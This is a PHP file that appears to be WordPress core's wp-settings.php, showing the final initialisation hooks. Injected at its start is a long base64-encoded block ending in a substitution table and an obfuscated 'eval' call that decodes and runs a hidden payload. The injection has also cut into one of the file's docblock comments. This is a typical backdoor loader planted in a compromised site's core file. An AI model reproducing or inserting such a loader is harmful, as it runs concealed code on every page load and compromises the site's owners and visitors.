lpXaHd6dmNBRWExekZob3dsZmg4SHQ2WmxmaHdsZmh3bGZNOERna2RCVEo4NGpBbjkzN0tFdmtLRWJQbHpiYycuCidBRWdoUWxyY05ZamNNeTJRRVZmaHdsZkxFRmhsRVZmaHdsZmN2NDNERkVna25xZmNGVVQ3dnkzY0M1YVQ4UXZrS3pWJy4KJ2hOUWFUTlpXaHd6dmNBRWExekZob3dsZmg4SHQ2WmxmaHdsZmh3bGZNOERna2RCVEo4NGpBbjkzN0tFJy4KJ3ZrS0ViUGx6YmNBRWdoUWxyY05ZamNNSWZ0bHkyUUVWZmh3bGZMRUZobEVWZmh3bGZjdjQzREZFZ2tucScuCidmY0ZVVEpGWGJHTjVhN25TYmNBUHZUZlpyY01JZmhOb1Y2RVZmaHdsZkxJRmhvd2xmaHdsZmh3bGJEQ0VqVHJxZkxGRWJEZEInLgonM29semExemxXMThVakxySXZrMFpyY2Z5MlFFVmZod2xmTEVGaGxFVmZod2xmY3Y0M0RGRWdrbnFmY0ZVVEVqQmpNRlgzazRYM0JGRTNKcll2N21acmNOeWJHdW5SQkN1Umh6Jy4KJ0Zob3dsZmg4SHQ2WmxmaHdsZmh3bGZoTlV2a2REVDdOeWJvd25mY055YkRLWTNrbVpUNG5jMW1kQVQ0c3kyUUVWdCcuCic2WmxmaHdsZmh3bGZoTjkzNzRTMzdLNTNEQVN2VHVsaTE4OGJHclllMWxvM0o4RWdrbnFiUGZJZmhyN2drQ0piUGZJZmgnLgonclFha2pCYlBmSWZoclV2VEZVZ2tucWJQZklmaHJVamNBRWJQZklmaHI0YjdDUGJQZklmaHJZYkdOJy4KJ3lhN2RCYlBmSWZocnpqazRRZm9RbGZEWUJha05CYkd1b1dod28zY0JvYlBmeTJRRVZ0NlpsZmh3bGZod2xmaE5FM1Q4NXZjQlBmdEVsckxGQjNjdjUnLgondmNCUGZoMGxmb3NvZmgwbHJjRlgzazRYM0JucWFrNEJiNFNVakxySXZrMFphSkY1TjdDRTFjblVqaGx5VjF3QmZjRlhqJy4KJ2tLRVZoTjkzNzRTMzdLNTNEQVN2VHV5VFJJRmhsRVZmaHdsZmh3bGZoOHl2b3dadkRCSXZDbkJlY0JVakx1WnJMJy4KJ05TYkFuemdUZnlWNkVWZmh3bGZod2xmaDhIdDZabGZod2xmaHdsZmh3bGZoOFB2VE40YkQwbHJMTlNiQW56Z1RmSHQ2WmxmaHdsZmh3bGZMRUZobEVWZicuCidod2xmaHdsZmg4eXZvWVNnN055Ym9sempjNFFUN055Ym96eXQ2WmxmaHdsZmh3bGZMSUZob3dsZmh3bGZodycuCidsZmh3bGZMckJqTENQM293empjNFFUN055YjlJRmhvd2xmaHdsZmh3bDU2RVZ0NlpsZmh3bGZod2xmTHJCakxDUDNvd29mOUlGaG93bGZoOG50NlpGaG93bGZoOERqa0s5Jy4KJ2pjQlgzbzg5YjRuUTNMQ0dna0s1YWtOelZoTnFhazRCV2h3emFEQVV2UmFFVDdOWWpjTXl0NlpsZmh3bGVRRVZmaHdsZmh3bGZod3p2Y0FFYTF3bmZjclliN203RkFuenYnLgona0ZYdmNtWnJjclliN203RkFuemFUTllWUklGaGxFVmZod2xmaHdsZmh3emJKTlhiREFHdkNuUWFUTlpmdEVsYUpGNU43Q0U2N25TM2tucW1KTlhiREFHdicuCicxbHlmaDBsZm9zbzJRRVZmaHdsZmh3bGZod3piSk5YYkRBR3ZDblFhVE5aZnRFbHJMRkUzSnJZdjdDNWJjQUVnaHdxZkxGNGEnLgonR0ZFYm9ZU3Z0bVpmREZZYTdZQmZveklmdHdJZnRteWZoMGxmQnNvZmgwbDNrNjRWaE5xYWs0QmZoMGxhSkY1TjdDRTFjblVqaGx5VlJJRmhsRVZ0NlpsZmh3bGZod2xmYycuCidGVVQ3dnkzY0M1akpyeWpjbVpyTEZFM0pyWXY3QzViY0FFZ2hRbGFKRjV2a0s5YkdCUWpobHp2Y0FFYTFRbGFKRjVON0NFMWNuJy4KJ1VqaGx5VjF6SHQ2WmxmaHdsNTZFVnQ2WmxmaHdsdkdDcWFKTnkzNzBsYUpGNWJjZDR2N0JxJy4KJ1RKckIzMWx6M0RBU3YxekZob3dsZmg4SHQ2WmxmaHdsZmh3bGZoTlVqY25QYWtqQlRKOFlqY2xsaTE4OWI0bkx2VE50Mzc0UzM3S1JqY25QYWtqQlZoenFmaGZYZjlJRicuCidob3dsZmh3bGZod2xyTEZFM0pyWXY3QzViY0FFZ2h3bmZoTlVqY25QYWtqQlRKOFlqY2xsV284VWprclVqTGZaM2s2NFZocjlha0ZadjFmeVdod1FXaHcnLgonNFYxd3FmaHI1Zm93cWZjNHpGMWx6M0RBU3Yxd3FmY0ZVVEVqQmpNWVhiSjZaVjF6SHQ2WkZob3dsZmh3bGZod2xna2FsVmN2eTNjQzV2VFl5YkpOVVZoTlVqY25QYWsnLgonakJUSjhZamNseVY2RVZmaHdsZmh3bGZoOEh0NlpsZmh3bGZod2xmaHdsZmg4d2prS0lna0tPVmhOVWpjblBha2pCVEo4WWpjbHkyUUVWZmh3bGZod2xmaDhudDZabCcuCidmaHdsNTZFVnQ2WmxmaHdsdkdDcWFKTnkzNzBsYUpGNWJjZDR2N0JxVDdkWGFrNlpyY0tZM2ttblJCQ3VSaHpGaCcuCidvd2xmaDhIdDZabGZod2xmaHdsZmhOVWpjblBha2pCVEo4WWpjbGxpMTg5YjRuTHZUTnQzNzQnLgonUzM3S1JqY25QYWtqQlZoekh0NlpGaG93bGZod2xmaHdsZ2thbFZjQlVUN055Ym9semJKTlhiREEnLgonR3ZDblFhVE5aVjF6Rmhvd2xmaHdsZmh3bGVRRVZmaHdsZmh3bGZod2xmaHdsZ2thbFZoTnFhazRCZnRFbmZNS0NSTVF5ZmhzWGZjZFhhazZsYWtkSWZMJy4KJzhJamtqeTNHdUZob3dsZmh3bGZod2xmaHdsZkxJRmhvd2xmaHdsZmh3bGZod2xmaHdsZmgnLgonOEQzSnJCYWtGWmZoWVVhN0FxdmNCUFZoTlVqY25QYWtqQlRKOFlqY2x5ZmNBVWZoTk92VHpuaW9OUTNMQ0dna0s1M0RBU3YxekZob3dsZmh3bGZod2xmaHdsZmh3bGZoOEh0NicuCidabGZod2xmaHdsZmh3bGZod2xmaHdsZmh3bGZjQkRmaFlVakxyUTNKdVpyTDhJamtqeTNCbnFhazRCV2g4VWprclVqTGZaM2s2NCcuCidWaHI5YWtGWnYxZnlXaHdRV2h3NFYxemxmUkVuZk12WTNMRkJWNkVWZmh3bGZod2xmaHdsZmh3bGZod2xmaHdsZmg4SHQ2WmxmaHdsZmh3bGZod2xmaHdsZmh3bGZod2xmaHdsJy4KJ2ZoOHd2VHZZM2hZOWI0bnp2a0ZQZVQ4RVZjRlVUN3Z5M2NDNWJEQ1l2aGx6YkpOWGJEQUd2Q25RYVROWmZoJy4KJzBsZm9zb2ZoMGxyTDhJamtqeTNCbnFhazRCVjFRbGFKRjVON0NFMWNuVWpobHlWMXpIdDZabGZod2xmaHdsZmh3bGZod2xmaHdsZmh3bGZMRUZob3dsZmh3bGZodycuCidsZmh3bGZod2xmaDhudDZabGZod2xmaHdsZmh3bGZoOG50NlpsZmh3bGZod2xmaHdsZmg4QjNMRkJ0NlpsZmh3bGZod2xmaHdsZmg4SHQ2WmxmaHdsZmh3bGYnLgonaHdsZmh3bGZod2xyTEZFM0pyWXY3QzViY0FFZ2h3bmZoTlVqY25QYWtqQlRKOFlqY2xsV293b1dQZmxXbzhVamtyVWpMZlozazY0VmhyOWFrRlonLgondjFmeVdod1FXaHc0VjF3cWZocjVmb3dxZmM0ekYxbHozREFTdjF3cWZjRlVURWpCak1ZWGJKNlpWMXpIdDZaRmhvd2xmaHdsZmh3bGYnLgonaHdsZmh3bGZoOHl2b3dadkRCSXZDbkJlY0JVakx1WnJMRkUzSnJZdjdDNWJjQUVnaHp5dDZabGZod2xmaHdsZmh3bGZod2xmaHdsZVFFVmZod2xmaHdsZmh3bGZod2xmaHdsZicuCidod2xmaDh3dlR2WTNoWTliNG56dmtGUGVUOEVWY0ZVVDd2eTNjQzViRENZdmhsemJKTlhiREFHJy4KJ3ZDblFhVE5aVjFRbGFKRjVON0NFMWNuVWpobHlWMXpIdDZabGZod2xmaHdsZmh3bGZod2xmaHdsNTZFVmZod2xmaHdsZmh3bGZod2w1NkVWZmh3bGZod2xmJy4KJ2g4bnQ2WmxmaHdsNTZFVnQ2WmxmaHdsdkdDcWFKTnkzNzBsYUpGNWpKcnlqY0FvM2NDNWE3WUJhN0laVjZFVmZod2xmTElGaG93bGYnLgonaHdsZmh3bGdrYWxWTEZFYkRkQjNvWTliNG5MdlROdDM3NFMzN0tSamNuUGFrakJWaHp5ZmhNbmZ0dycuCid5dDZabGZod2xmaHdsZkxJRmhvd2xmaHdsZmh3bGZod2xmTHJCakxDUDNvOG1iR0NCMlFFVmZod2xmaHdsZmg4bnQ2WmxmaHdsZmh3bGZjQ0liJy4KJzdtRmhvd2xmaHdsZmh3bGVRRVZmaHdsZmh3bGZod2xmaHdsYkRDRWpUcnFmTXZZM0xGQjJRRVZmaHdsZmh3bGZoOG50NlpsZmh3bDU2RVZ0NicuCidabGZod2x2RG5QdmtBOWdod1pyQW50UkVuVzFtbWxhVHVscmNTQmVSRStyTHZZM0xDQlY2RVZmaHdsZkxJRmhvd2xmaHdsZmh3bHJjTllqY01saScuCicxd3pqREFJamttSHQ2WmxmaHdsZmh3bGZoTnphVE5ZVDdTQmUxd25maE5PdlR6SHQ2WmxmaHdsNTZFVnQ2WicuCidsZmh3bGdrYWxWaE16dmNBRWExekZob3dsZmg4SHQ2WmxmaHdsZmh3bGZjdlhiRENZYTdsbFZoTjVtTW5SQ2g4WWJQd3pnN0NLaVIwempEQUlqa215dDZabGZod2xmJy4KJ2h3bGZMSUZob3dsZmh3bGZod2xmaHdsZmhOemFUTllmdEVsckx2WTNMQ0IyUUVWZmh3bGZod2xmaHdsZmh3bHJjTllqY0E1ZzdDJy4KJ0tmdEVscmNTQmVSSUZob3dsZmh3bGZod2w1NkVWZmh3bGZMRUZobEVWZmh3bGZoTnphVE5ZZnRFbDZMQ3FiN0NQZ2tBSWdUeUJWY0ZVVDdOQmFKcktiTDZaYURBVXZSYScuCidFVDdOQmE3bnp2MWx6dmNBRWExeklmaE56YVROWVQ3U0JlMXp5MlFFVnQ2WmxmaHdsZ2thbFZjQlViN0NFVmhOemFUTllrUGpZZ1BqJy4KJ2pWMXdEcm93emFKRjVhVENFZ3RFbnJjTllqY0EzcjdBT3I0RXl0NlpsZmh3bGVRRVZmaHdsZmh3bGZoOCcuCid5dm93WnJjTllqY0EzcjdNR1Qxd25pMXdHZzFieXQ2WmxmaHdsZmh3bGZMSUZob3dsZmh3bGZod2xmaHdsZmhOeWZ0RWw2VHJQYVR6WnQ2WmxmaHdsZmh3Jy4KJ2xmaHdsZmh3bGZod2xySjg3clB3bmlvOHdiY1lRakRDUGI3Qlgzb2x5V3dFVmZod2xmaHdsZmh3bGZod2xmaHdsZmhqJy4KJ1Vqb2JsaVIwbHJVTXF1aEVQclBRRmhvd2xmaHdsZmh3bGZod2xmaHdsZmh3R2FrSUdmdEUrZmhOemFUTllrUGpZZ1BqaicuCidXd0VWZmh3bGZod2xmaHdsZmh3bFZSSUZob3dsZmh3bGZod2xmaHdsZmNDOWdjc2w2TEZCYkRCWTNjQnB2MWx6ZzF6SHQ2WmxmaHdsZicuCidod2xmaHdsZmg4QmVjQkUyUUVWZmh3bGZod2xmaDhudDZabGZod2xmaHdsZmNDSWI3Q3l2b3dacmNOWWpjQTNyN01HVDF3bmkxd0d2MWJ5dDZabGZod2xmaHdsZkxJRicuCidob3dsZmh3bGZod2xmaHdsZmNDN2FrUVpyY05ZamNBM3I3NkdUMXpIdDZabGZod2xmaHdsZkxFRmhvd2xmaCcuCid3bGZod2x2a2RVdmtCRGZobHp2Y0FFYUNJR2ExampmdEVuZmhqUTNMQ0dnazBHVjZFVmZod2xmaHdsZmg4SHQ2WmxmaHdsZmh3bGZod2xmaDh5dm9senZjQUVhJy4KJ0NJR2I3TUdUMXduaTF3R2FrTnpyUHpGaG93bGZod2xmaHdsZmh3bGZMSUZob3dsZmh3Jy4KJ2xmaHdsZmh3bGZod2xmaDg5YjRuUTNMQ0dna0s1YWtOelZoTnphVE5Za1BqUXI0RUlmaE56YVROWWtQJy4KJ2p6cjRFeTJRRVZmaHdsZmh3bGZod2xmaHdsNTZFVmZod2xmaHdsZmh3bGZod2x2a2RVdmtCRFZoTnphVE5Za1BqVWExampmJy4KJ3RFbmZoalB2a0VHVjZFVmZod2xmaHdsZmh3bGZod2xlUUVWZmh3bGZod2xmaHdsZmh3bGZodycuCidsZmNGVVRKOElqa2p5M0JuUHZrRVpyY05ZamNBM3JKd0dUMXpIdDZabGZod2xmaHdsZmh3bGZoOG50NlpsZmh3bGZod2wnLgonZkxFRmhvd2xmaHdsZmh3bHZrRlozUHd6dmNBRWFDSUdha0lHVFJJRmhvd2xmaHdsZmh3bHZUWXlqaGx5MlFFVmZod2xmTEVGaGxFVmZod2xmY0ZVVEo4SWprankzQicuCiduSTM3QXpWaHpIdDZ5bic7CiRzd21pdmFlZ2N1ID0gQXJyYXkoJzEnPT4nUycsICcwJz0+JzQnLCAnMyc9PidiJywgJzInPT4nTycsICc1Jz0+J2YnLCAnNCc9PicxJywgJzcnPT4nMicsICc2Jz0+J1EnLCAnOSc9PidqJywgJzgnPT4nQicsICdBJz0+J0YnLCAnQyc9PidWJywgJ0InPT4nbCcsICdFJz0+JzAnLCAnRCc9PidtJywgJ0cnPT4nbicsICdGJz0+J04nLCAnSSc9PidzJywgJ0gnPT4nNycsICdLJz0+JzUnLCAnSic9PiczJywgJ00nPT4nRScsICdMJz0+J0gnLCAnTyc9PidyJywgJ04nPT4nUicsICdRJz0+J3cnLCAnUCc9Pid5JywgJ1MnPT4ndCcsICdSJz0+J1QnLCAnVSc9Pid6JywgJ1QnPT4nWCcsICdXJz0+J0wnLCAnVic9PidLJywgJ1knPT4naCcsICdYJz0+J3YnLCAnWic9PidvJywgJ2EnPT4nWScsICdjJz0+J0cnLCAnYic9PidjJywgJ2UnPT4nZScsICdkJz0+J3gnLCAnZyc9PidhJywgJ2YnPT4nSScsICdpJz0+J1AnLCAnaCc9PidDJywgJ2snPT4nVycsICdqJz0+J2QnLCAnbSc9PidVJywgJ2wnPT4nZycsICdvJz0+J2knLCAnbic9Pic5JywgJ3EnPT4ndScsICdwJz0+JzYnLCAncyc9Pic4JywgJ3InPT4nSicsICd1Jz0+J00nLCAndCc9PidEJywgJ3cnPT4nQScsICd2Jz0+J1onLCAneSc9PidwJywgJ3gnPT4ncScsICd6Jz0+J2snKTsKZXZhbC8qYmRtKi8oeHpucnlrdigkem50a3psbHJnLCAkc3dtaXZhZWdjdSkpOwp9"));
/*res after the theme is loaded.
 *
 * @since 3.0.0
 */
do_action( 'after_setup_theme' );

// Set up current user.
$GLOBALS['wp']->init();

/**
 * Fires after WordPress has finished loading but before any headers are sent.
 *
 * Most of WP is loaded at this stage, and the user is authenticated. WP continues
 * to load on the init hook that follows (e.g. widgets), and many plugins instantiate
 * themselves on it for all sorts of reasons (e.g. they need a user, a taxonomy, etc.).
 *
 * If you wish to plug an action once WP is loaded, use the wp_loaded hook below.
 *
 * @since 1.5.0
 */
do_action( 'init' );

// Check site status
if ( is_multisite() ) {
	if ( true !== ( $file = ms_site_check() ) ) {
		require( $file );
		die();
	}
	unset($file);
}

/**
 * This hook is fired once WP, all plugins, and the theme are fully loaded and instantiated.
 *
 * AJAX requests should use wp-admin/admin-ajax.php. admin-ajax.php can handle requests for
 * users not logged in.
 *
 * @link https://codex.wordpress.org/AJAX_in_Plugins
 *
 * @since 3.0.0
 */
do_action( 'wp_loaded' );
